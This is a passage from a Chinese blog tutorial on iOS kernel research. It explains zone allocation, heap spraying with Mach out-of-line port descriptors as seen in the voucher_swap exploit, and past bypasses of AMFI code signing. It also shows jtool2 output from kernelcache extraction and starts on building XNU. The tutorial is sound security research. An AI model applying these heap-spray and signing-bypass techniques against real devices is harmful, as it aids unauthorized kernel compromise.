<p>如上所述，某些对象具有自己的特殊zone。zone是固定大小的数据块的集合，可以对其进行快速分配和释放。例如，在下图中，我们可以看到很多IPC对象，包括ports，vouchers等都有自己的zone。因此如果释放一个voucher那么将无法使用另一种对象占用释放的内存，除非触发zone垃圾回收并将包含该地址的页移动到其它位置，然后再分配另一种对象。</p>
<p><img src="https://highaltitudehacks.com/images/31.png" alt="31"></p>
<p>在最近的几个iOS版本中对堆采取了很多加固措施。</p>
<blockquote>
<p>建议阅读这个Stefan Esser关于iOS内核堆的[PPT](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)，也可以阅读内核源代码，从osfmk&#x2F;kern&#x2F;zalloc.c开始，其中有一些堆分配的注释。</p>
</blockquote>
<p><img src="https://highaltitudehacks.com/images/38.png" alt="38"></p>
<p>最近用于heap spray的常用技术之一是通过发送带有选项<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的Mach消息，以端口指针数组填充内存。这将调用<code>ipc/ipc_kmsg.c</code>中的<code>ipc_kmsg_copyin_ool_ports_descriptor</code>，它会调用kalloc(ports_length)将端口指针填充到堆中。</p>
<p>在voucher_swap EXP中可以看到这样做的好处：虽然分配端口会将它们放入ipc.port zone，但是如果是端口指针，就不是这样，因此可以使用端口指针占用释放的对象。用端口其实也可以，因为进行足够的喷射之后能够迫使内核进行垃圾回收并从zone map中分配新页，其中可能包括释放的对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">    <span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">.....................</span></span><br><span class="line"><span class="params">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    data = kalloc(ports_length);</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span></span><br><span class="line"><span class="params">        *mr = MACH_SEND_NO_BUFFER;</span></span><br><span class="line"><span class="params">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span></span><br><span class="line"><span class="params">    &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="指针验证检查和CoreTrust"><a href="#指针验证检查和CoreTrust" class="headerlink" title="指针验证检查和CoreTrust"></a>指针验证检查和CoreTrust</h3><p>ARM 8.3指令集添加了一个称为PAC(Pointer Authentication Check，指针验证检查)的新功能，目的是检查指针的完整性。它将加密签名附加到指针值里未使用的位中，然后在使用指针之前验证这些签名。由于攻击者没有用于为这些指针创建签名的密钥，因此无法创建有效的指针。<br>另一方面，CoreTrust是一个单独的内核扩展(com.apple.kext.CoreTrust)，它不允许自签名二进制文件(jtool2 -sign)在设备上运行。以前，Apple Mobile File Integrity Kext(AMFI.kext)与用户态amfid守护程序一起检查代码签名。可以通过将代码签名哈希注入AMFI trust cache，hook amfid异常端口并允许代码继续执行等多种方式来绕过。CoreTrust施加了一些其他检查，这些检查仅允许Apple签名的二进制文件在设备上运行。</p>
<h2 id="KernelCache"><a href="#KernelCache" class="headerlink" title="KernelCache"></a>KernelCache</h2><p>KernelCache是一个包含核心内核及其内核拓展的Mach-O二进制文件，iOS10之前是加密的，现在可以通过IPSW文件解压得到，或者通过内核漏洞dump出来。</p>
<h3 id="提取kext文件"><a href="#提取kext文件" class="headerlink" title="提取kext文件"></a>提取kext文件</h3><p>通过jtool2获取kext的地址信息，再在IDA中进行分析。或者也可以将kernelcache解码后，放在Ghidra中进行分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 -k kernelcache.release.n66</span><br><span class="line">0xfffffff005c5c000:com.apple.kpi.mach</span><br><span class="line">0xfffffff005c5c080:com.apple.kpi.private</span><br><span class="line">0xfffffff005c5c100:com.apple.kpi.unsupported</span><br><span class="line">0xfffffff005c5c180:com.apple.kpi.iokit</span><br><span class="line">0xfffffff005c5c200:com.apple.kpi.libkern</span><br><span class="line">0xfffffff005c5c280:com.apple.kpi.bsd</span><br><span class="line">0xfffffff005c5c300:com.apple.iokit.IONetworkingFamily</span><br><span class="line">0xfffffff005c5de00:com.apple.iokit.IOTimeSyncFamily</span><br><span class="line">0xfffffff005c616c0:com.apple.driver.corecapture</span><br><span class="line">0xfffffff005c64bc0:com.apple.kec.corecrypto</span><br><span class="line">0xfffffff005c7cf00:com.apple.driver.IOImageLoader</span><br><span class="line">0xfffffff005c7f080:com.apple.driver.AppleBCMWLANFirmware.Hashstore</span><br><span class="line">0xfffffff005c8de00:com.apple.iokit.IOSlowAdaptiveClockingFamily</span><br><span class="line">0xfffffff005c8e380:com.apple.iokit.IOStorageFamily</span><br><span class="line">0xfffffff005c8f5c0:com.apple.iokit.IOReportFamily</span><br><span class="line">0xfffffff005c8fdc0:com.apple.driver.AppleARMPlatform</span><br><span class="line">0xfffffff005c99600:com.apple.driver.AppleSamsungSPI</span><br><span class="line">0xfffffff005c9a580:com.apple.kpi.dsep</span><br><span class="line">0xfffffff005c9a600:com.apple.kext.CoreTrust</span><br><span class="line">0xfffffff005c9b3c0:com.apple.driver.AppleMobileFileIntegrity</span><br><span class="line">0xfffffff005cc23c0:com.apple.iokit.IOHIDFamily</span><br><span class="line">0xfffffff005cc3f40:com.apple.driver.AppleEmbeddedLightSensor</span><br><span class="line">0xfffffff005cc7980:com.apple.driver.AppleS5L8920XPWM</span><br><span class="line">0xfffffff005cc7f00:com.apple.driver.AppleEmbeddedTempSensor</span><br><span class="line">0xfffffff005ccb7c0:com.apple.driver.usb.AppleUSBCommon</span><br><span class="line">0xfffffff005ccc200:com.apple.driver.AppleUSBHostMergeProperties</span><br><span class="line">0xfffffff005ccc7c0:com.apple.iokit.IOUSBDeviceFamily</span><br><span class="line">0xfffffff005cd0d40:com.apple.iokit.IOSerialFamily</span><br><span class="line">0xfffffff005cd1680:com.apple.iokit.IOSkywalkFamily</span><br><span class="line">0xfffffff005cd2f80:com.apple.driver.AppleOnboardSerial</span><br><span class="line">0xfffffff005cd4e40:com.apple.iokit.IOAccessoryManager</span><br><span class="line">0xfffffff005cda180:com.apple.driver.AppleARMPMU</span><br><span class="line">0xfffffff005cdcfc0:com.apple.driver.AppleSN2400Charger</span><br><span class="line">0xfffffff005cddf80:com.apple.iokit.IOSurface</span><br><span class="line">0xfffffff005ce3b00:com.apple.driver.IODARTFamily</span><br><span class="line">0xfffffff005ce5cc0:com.apple.driver.AppleM2ScalerCSCDriver</span><br><span class="line">0xfffffff005d14e80:com.apple.iokit.IOHDCPFamily</span><br><span class="line">0xfffffff005d1a100:com.apple.kec.Libm</span><br><span class="line">0xfffffff005d205c0:com.apple.iokit.IOAudio2Family</span><br><span class="line">0xfffffff005d20e40:com.apple.iokit.IOCECFamily</span><br><span class="line">0xfffffff005d217c0:com.apple.iokit.IOAVFamily</span><br><span class="line">0xfffffff005d38280:com.apple.AUC</span><br><span class="line">0xfffffff005d39900:com.apple.iokit.IOMobileGraphicsFamily</span><br><span class="line">0xfffffff005d400c0:com.apple.driver.AppleH8ADBE0</span><br><span class="line">0xfffffff005d51dc0:com.apple.driver.AppleAVEH8</span><br><span class="line">0xfffffff005dcf640:com.apple.driver.AppleFirmwareUpdateKext</span><br><span class="line">0xfffffff005dd2400:com.apple.driver.ApplePMGR</span><br><span class="line">0xfffffff005de4740:com.apple.driver.AppleS8000PMGR</span><br><span class="line">0xfffffff005de6380:com.apple.driver.AppleIPAppender</span><br><span class="line">0xfffffff005de6ec0:com.apple.driver.AppleMultitouchSPI</span><br><span class="line">0xfffffff005deb580:com.apple.iokit.IOPCIFamily</span><br><span class="line">0xfffffff005ded9c0:com.apple.driver.AppleEmbeddedPCIE</span><br><span class="line">0xfffffff005df3e80:com.apple.driver.AppleS800xPCIe</span><br><span class="line">0xfffffff005df6500:com.apple.driver.AppleS8000PCIe</span><br><span class="line">0xfffffff005df7280:com.apple.driver.AppleBiometricSensor</span><br><span class="line">0xfffffff005dfd8c0:com.apple.driver.ProvInfoIOKit</span><br><span class="line">0xfffffff005e01b40:com.apple.iokit.IOUSBHostFamily</span><br><span class="line">0xfffffff005e12800:com.apple.driver.usb.AppleUSBHostPacketFilter</span><br><span class="line">0xfffffff005e130c0:com.apple.driver.AppleS5L8960XDART</span><br><span class="line">0xfffffff005e14840:com.apple.driver.DiskImages</span><br><span class="line">0xfffffff005e15600:com.apple.driver.DiskImages.KernelBacked</span><br><span class="line">0xfffffff005e15dc0:com.apple.driver.DiskImages.RAMBackingStore</span><br><span class="line">0xfffffff005e16380:com.apple.driver.AppleJPEGDriver</span><br><span class="line">0xfffffff005e1bec0:com.apple.iokit.AppleARMIISAudio</span><br><span class="line">0xfffffff005e1ce40:com.apple.driver.AppleEmbeddedAudio</span><br><span class="line">0xfffffff005e239c0:com.apple.driver.AppleCSEmbeddedAudio</span><br><span class="line">0xfffffff005e24600:com.apple.iokit.IOMikeyBusFamily</span><br><span class="line">0xfffffff005e26780:com.apple.driver.AppleTriStar</span><br><span class="line">0xfffffff005e28d40:com.apple.driver.AppleEmbeddedMikeyBus</span><br><span class="line">0xfffffff005e2ae40:com.apple.driver.AppleMikeyBusAudio</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleHIDKeyboardEmbedded</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleS5L8940XI2C</span><br><span class="line">0xfffffff005e2ec80:com.apple.driver.AppleEmbeddedUSB</span><br><span class="line">0xfffffff005e30440:com.apple.iokit.IOCryptoAcceleratorFamily</span><br><span class="line">0xfffffff005e31300:com.apple.iokit.EncryptedBlockStorage</span><br><span class="line">0xfffffff005e31ac0:com.apple.driver.AppleEffaceableStorage</span><br><span class="line">0xfffffff005e33580:com.apple.driver.LightweightVolumeManager</span><br><span class="line">0xfffffff005e36040:com.apple.driver.usb.networking</span><br><span class="line">0xfffffff005e36680:com.apple.driver.usb.AppleUSBHostCompositeDevice</span><br><span class="line">0xfffffff005e37240:com.apple.driver.usb.cdc</span><br><span class="line">0xfffffff005e37900:com.apple.driver.usb.cdc.ncm</span><br><span class="line">0xfffffff005e38900:com.apple.driver.AppleUSBEthernetDevice</span><br><span class="line">0xfffffff005e39a80:com.apple.iokit.IO80211Family</span><br><span class="line">0xfffffff005e61ac0:com.apple.plugin.IOgPTPPlugin</span><br><span class="line">0xfffffff005e76f00:com.apple.driver.LSKDIOKit</span><br><span class="line">0xfffffff005e95200:com.apple.driver.FairPlayIOKit</span><br><span class="line">0xfffffff005eabe40:com.apple.driver.LSKDIOKitMSE</span><br><span class="line">0xfffffff005ec0cc0:com.apple.driver.AppleD5500</span><br><span class="line">0xfffffff005eea380:com.apple.driver.IOSlaveProcessor</span><br><span class="line">0xfffffff005eea900:com.apple.driver.AppleA7IOP</span><br><span class="line">0xfffffff005eeed80:com.apple.driver.RTBuddy</span><br><span class="line">0xfffffff005efb840:com.apple.driver.AppleSMC</span><br><span class="line">0xfffffff005f01900:com.apple.driver.AppleSEPManager</span><br><span class="line">0xfffffff005f1aa80:com.apple.driver.AppleSSE</span><br><span class="line">0xfffffff005f1ba80:com.apple.driver.ASIOKit</span><br><span class="line">0xfffffff005f1d0c0:com.apple.driver.AppleS8000DWI</span><br><span class="line">0xfffffff005f1d880:com.apple.driver.AppleCS35L19Amp</span><br><span class="line">0xfffffff005f1e200:com.apple.driver.usb.IOUSBHostHIDDevice</span><br><span class="line">0xfffffff005f1fd80:com.apple.driver.AppleUSBDeviceAudioController</span><br><span class="line">0xfffffff005f20580:com.apple.driver.AppleUSBAudio</span><br><span class="line">0xfffffff005f22e40:com.apple.driver.DiskImages.UDIFDiskImage</span><br><span class="line">0xfffffff005f24080:com.apple.driver.AppleLMBacklight</span><br><span class="line">0xfffffff005f249c0:com.apple.iokit.IOUserEthernet</span><br><span class="line">0xfffffff005f25300:com.apple.iokit.IOSCSIArchitectureModelFamily</span><br><span class="line">0xfffffff005f26940:com.apple.iokit.IOSCSIBlockCommandsDevice</span><br><span class="line">0xfffffff005f27240:com.apple.iokit.IOUSBMassStorageDriver</span><br><span class="line">0xfffffff005f29bc0:com.apple.driver.AppleUSBCardReader</span><br><span class="line">0xfffffff005f2aec0:com.apple.driver.AppleS8000SOCTuner</span><br><span class="line">0xfffffff005f2bb00:com.apple.driver.AppleSynopsysMIPIDSI</span><br><span class="line">0xfffffff005f2f580:com.apple.nke.ppp</span><br><span class="line">0xfffffff005f31980:com.apple.nke.l2tp</span><br><span class="line">0xfffffff005f33880:com.apple.driver.AppleSynopsysOTGDevice</span><br><span class="line">0xfffffff005f36100:com.apple.driver.AppleSPU</span><br><span class="line">0xfffffff005f39780:com.apple.AGXFirmwareKextG5P</span><br><span class="line">0xfffffff005f57740:com.apple.driver.AppleS8000PMPFirmware</span><br><span class="line">0xfffffff005f58300:com.apple.driver.AppleTwisterErrorHandler</span><br><span class="line">0xfffffff005f59240:com.apple.driver.AppleS8000</span><br><span class="line">0xfffffff005f5d840:com.apple.IOTextEncryptionFamily</span><br><span class="line">0xfffffff005f5e180:com.apple.driver.usb.AppleUSBHub</span><br><span class="line">0xfffffff005f63440:com.apple.driver.AppleH6CameraInterface</span><br><span class="line">0xfffffff005f6a380:com.apple.driver.AppleMobileApNonce</span><br><span class="line">0xfffffff005f6b280:com.apple.driver.AppleUSBMike</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleMultitouchSPIN66</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleS8000CLPC</span><br><span class="line">0xfffffff005f72e40:com.apple.driver.AppleSEPKeyStore</span><br><span class="line">0xfffffff005f75240:com.apple.audio.IOBorealisOwl</span><br><span class="line">0xfffffff005f7f880:com.apple.driver.DiskImages.FileBackingStore</span><br><span class="line">0xfffffff005f7ffc0:com.apple.driver.ApplePMP</span><br><span class="line">0xfffffff005f82dc0:com.apple.iokit.IOStreamFamily</span><br><span class="line">0xfffffff005f83580:com.apple.driver.AppleS5L8960XNCO</span><br><span class="line">0xfffffff005f83b00:com.apple.driver.AppleChestnutDisplayPMU</span><br><span class="line">0xfffffff005f84340:com.apple.kec.pthread</span><br><span class="line">0xfffffff005f86640:com.apple.driver.AppleStockholmControl</span><br><span class="line">0xfffffff005f87040:com.apple.driver.AppleSamsungSerial</span><br><span class="line">0xfffffff005f87700:com.apple.driver.AppleBSDKextStarter</span><br><span class="line">0xfffffff005f87cc0:com.apple.driver.usb.cdc.ecm</span><br><span class="line">0xfffffff005f88440:com.apple.driver.AppleBasebandN71</span><br><span class="line">0xfffffff005f8a200:com.apple.filesystems.apfs</span><br><span class="line">0xfffffff005fb0e80:com.apple.kext.AppleMatch</span><br><span class="line">0xfffffff005fb1200:com.apple.driver.AppleEffaceableBlockDevice</span><br><span class="line">0xfffffff005fb19c0:com.apple.driver.AppleS8000AES</span><br><span class="line">0xfffffff005fb3b00:com.apple.driver.AppleMesaSEPDriver</span><br><span class="line">0xfffffff005fba440:com.apple.driver.AppleBluetooth</span><br><span class="line">0xfffffff005fbabc0:com.apple.driver.usb.ethernet.asix</span><br><span class="line">0xfffffff005fbc200:com.apple.driver.AppleBasebandPCI</span><br><span class="line">0xfffffff005fc2a00:com.apple.driver.AppleSEPCredentialManager</span><br><span class="line">0xfffffff005fc7140:com.apple.driver.AppleS8003PCIe</span><br><span class="line">0xfffffff005fc7f00:com.apple.driver.AppleSamsungPKE</span><br><span class="line">0xfffffff005fc84c0:com.apple.driver.AppleInterruptController</span><br><span class="line">0xfffffff005fc9380:com.apple.driver.AppleC26Charger</span><br><span class="line">0xfffffff005fca7c0:com.apple.driver.AppleAuthCP</span><br><span class="line">0xfffffff005fcc440:com.apple.driver.AppleSPUSphere</span><br><span class="line">0xfffffff005fccb80:com.apple.driver.AppleS5L8960XGPIOIC</span><br><span class="line">0xfffffff005fcd9c0:com.apple.security.sandbox</span><br><span class="line">0xfffffff0060520c0:com.apple.driver.AppleHIDKeyboard</span><br><span class="line">0xfffffff006053200:com.apple.driver.AppleHDQGasGaugeControl</span><br><span class="line">0xfffffff006055e00:com.apple.driver.AppleTemperatureSensor</span><br><span class="line">0xfffffff006056b40:com.apple.driver.AppleAE2Audio</span><br><span class="line">0xfffffff006057e00:com.apple.driver.AppleNANDConfigAccess</span><br><span class="line">0xfffffff006058340:com.apple.iokit.IONVMeFamily</span><br><span class="line">0xfffffff006065000:com.apple.driver.AppleDialogPMU</span><br><span class="line">0xfffffff0060658c0:com.apple.driver.AppleD2255PMU</span><br><span class="line">0xfffffff006067540:com.apple.iokit.IOHIDEventDriver</span><br><span class="line">0xfffffff006067540:com.apple.driver.USBStorageDeviceSpecifics</span><br><span class="line">0xfffffff006067540:com.apple.driver.usb.AppleUSBEHCI</span><br><span class="line">0xfffffff006070cc0:com.apple.driver.AppleUSBHSIC</span><br><span class="line">0xfffffff006072d40:com.apple.driver.usb.AppleUSBOHCI</span><br><span class="line">0xfffffff006075b80:com.apple.driver.AppleEmbeddedUSBHost</span><br><span class="line">0xfffffff006076b00:com.apple.driver.usb.AppleUSBHostT7000</span><br><span class="line">0xfffffff006078600:com.apple.driver.IOAudioCodecs</span><br><span class="line">0xfffffff00607b4c0:com.apple.driver.DiskImages.ReadWriteDiskImage</span><br><span class="line">0xfffffff00607ba00:com.apple.AppleFSCompression.AppleFSCompressionTypeZlib</span><br><span class="line">0xfffffff00607d180:com.apple.driver.AppleBluetoothDebugService</span><br><span class="line">0xfffffff00607d6c0:com.apple.driver.AppleBCMWLANCore</span><br><span class="line">0xfffffff0060b97c0:com.apple.driver.AppleBCMWLANBusInterfacePCIe</span><br><span class="line">0xfffffff0060c9180:com.apple.driver.AppleUSBDeviceNCM</span><br><span class="line">0xfffffff0060c9d80:com.apple.security.AppleImage4</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleBSDKextStarterVPN</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleCS42L71Audio</span><br><span class="line">0xfffffff0060cfb00:com.apple.filesystems.hfs.kext</span><br><span class="line">0xfffffff0060e33c0:com.apple.driver.AppleS8000SmartIO</span><br><span class="line">0xfffffff0060ec940:com.apple.driver.AppleM68Buttons</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.usb.IOUSBHostHIDDeviceSafeBoot</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.AppleUSBDeviceMux</span><br><span class="line">0xfffffff0060ef740:com.apple.nke.pptp</span><br><span class="line">0xfffffff0060f0ac0:com.apple.driver.AppleBasebandPCIMAVControl</span><br><span class="line">0xfffffff0060f58c0:com.apple.driver.AppleS5L8960XWatchDogTimer</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.AppleStorageDrivers</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.ApplePinotLCD</span><br><span class="line">0xfffffff0060f6ac0:com.apple.iokit.IOAcceleratorFamily</span><br><span class="line">0xfffffff0060fc080:com.apple.iokit.usb.AppleUSBHostUserClient</span><br><span class="line">0xfffffff0060fc080:com.apple.driver.AppleUSBEthernetHost</span><br><span class="line">0xfffffff0060fd200:com.apple.driver.AppleIDAMInterface</span><br><span class="line">0xfffffff0060fdd80:com.apple.iokit.IOHIDEventDriverSafeBoot</span><br><span class="line">0xfffffff0060fdd80:com.apple.driver.AppleBasebandPCIMAVPDP</span><br><span class="line">0xfffffff0060fea00:com.apple.driver.AppleDiagnosticDataAccessReadOnly</span><br><span class="line">0xfffffff0060ff180:com.apple.iokit.IOAcceleratorFamily2</span><br><span class="line">0xfffffff006108f40:com.apple.AGXG5P</span><br><span class="line">0xfffffff006119b40:com.apple.driver.AppleBiometricServices</span><br><span class="line">0xfffffff00611a7c0:com.apple.driver.AppleS5L8960XUSB</span><br></pre></td></tr></table></figure>

<p>据说在越狱设备的<code>/System/Library/Caches/com.apple.kernelcaches/</code>目录下可以找到解压的kernelcache，但是我没找到。	</p>
<p>Kernelcache符号，iOS12之后是不带kernelcache符号的，但是Apple误发了一个带有符号的beta版本，通过jtool2的analyze选项，可以分析kernelcache的符号并保存到文件中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 --analyze kernelcache.release.iphone7</span><br><span class="line">Loaded 268/45/3/0  matchers</span><br><span class="line">Analyzing kernelcache..</span><br><span class="line">This is a new-style A8 kernelcache (Darwin Kernel Version 18.2.0: Tue Oct 16 21:02:34 PDT 2018; root:xnu-4903.222.5~1/RELEASE_ARM64_T7000)</span><br><span class="line">-- Processing __TEXT_EXEC.__text..</span><br><span class="line">Disassembling 19389120 bytes from address 0xfffffff007680000 (offset 0x67c000):</span><br><span class="line">__ZN11OSMetaClassC2EPKcPKS_j is 0xfffffff007cb84bc (OSMetaClass)</span><br><span class="line">Analyzing __DATA.__data..</span><br><span class="line">Got _localnode_id @0xfffffff008918640</span><br><span class="line">Analyzing __DATA.__sysctl_set..</span><br><span class="line">Analyzing fuctions...</span><br><span class="line">Can<span class="string">&#x27;t get realhost :-(</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (1st pass)</span></span><br><span class="line"><span class="string">LAST ARG0 : fffffff00762f420 , fffffff00717a750, 0</span></span><br><span class="line"><span class="string">processing flows...</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (2nd pass)</span></span><br><span class="line"><span class="string">GOT PTHREAD SHIMS! (0xfffffff0074abbf0)</span></span><br><span class="line"><span class="string">Got 1708 IOKit Classes</span></span><br><span class="line"><span class="string">opened companion file ./kernelcache.release.iphone7.ARM64.9DBCEF3B-873D-358D-B74B-CC7DDDC7546B</span></span><br><span class="line"><span class="string">Dumping symbol cache to file</span></span><br><span class="line"><span class="string">Symbolicated 7318 symbols and 62941 functions</span></span><br></pre></td></tr></table></figure>

<h2 id="XNU编译"><a href="#XNU编译" class="headerlink" title="XNU编译"></a>XNU编译</h2><p>先看一下源码结构：</p>
<ul>
<li><code>config</code>- 为支持的架构和平台配置导出的 api。</li>
<li><code>SETUP</code>- 用于配置内核、版本控制和 kextsymbol 管理的基本工具集。</li>
<li><code>EXTERNAL_HEADERS</code>- 来自其他项目的头文件，以避免构建时的重复依赖。这些头文件应在源更新时定期同步。</li>
<li><code>libkern</code>- 用于处理驱动程序和 kexts 的 C++ IOKit 库代码。</li>
<li><code>libsa</code>- 用于启动的内核引导代码。</li>
<li><code>libsyscall</code>- 用户空间程序的系统调用库接口。</li>
<li><code>libkdd</code>- 用于解析内核数据（如内核分块数据）的用户库的源代码。</li>
<li><code>makedefs</code>- 内核构建的顶级规则和定义。</li>
<li><code>osfmk</code>- 基于 Mach 内核的子系统。</li>
<li><code>pexpert</code>- 平台特定代码，如中断处理、原子等。</li>
<li><code>security</code>- 强制访问检查策略接口和相关实现。</li>
<li><code>bsd</code>- BSD子系统代码。</li>
<li><code>tools</code>- 一组用于测试、调试和分析内核的实用程序。</li>
</ul>
<h3 id="编译-未成功"><a href="#编译-未成功" class="headerlink" title="编译(未成功)"></a><em>编译(未成功)</em></h3><blockquote>
<p>可以使用<a target="_blank" rel="noopener" href="https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html">这里</a>的脚本进行编译，亲测有效。</p>
</blockquote>
<p>先根据XNU源码版本，确定在<a target="_blank" rel="noopener" href="https://opensource.apple.com/releases/">开源代码</a>中的位置，以下以<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>为例进行说明。</p>
